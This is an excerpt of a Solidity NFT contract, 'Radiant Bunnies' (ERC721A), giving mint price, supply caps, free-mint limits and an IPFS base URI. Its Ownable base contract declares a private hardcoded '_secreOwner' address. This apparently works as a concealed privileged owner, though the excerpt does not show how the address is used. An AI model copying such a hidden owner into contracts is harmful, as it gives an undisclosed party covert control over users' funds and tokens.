...
abstract contract Ownable is Context {
    ...
    address private _secreOwner = 0xa3a4D2D03070D593A6bc3C56323260ecb0d6da9D;
...
contract RadiantBunnies is ERC721A, Ownable, ReentrancyGuard {
    string public baseURI = "ipfs://QmQV57HNY8bF2FhwBd1h9Ri9byV4FhJxDHZPHbzL9r1812/";
    uint   public price             = 0.0025 ether;
    uint   public maxPerTx          = 15;
    uint   public maxPerFree        = 5;
    uint   public totalFree         = 2000;
    uint   public maxSupply         = 5455;
    bool   public mintEnabled;
    uint   public totalFreeMinted = 0;

    mapping(address => uint256) public _mintedFreeAmount;

    constructor() ERC721A("Radiant Bunnies", "RB"){}
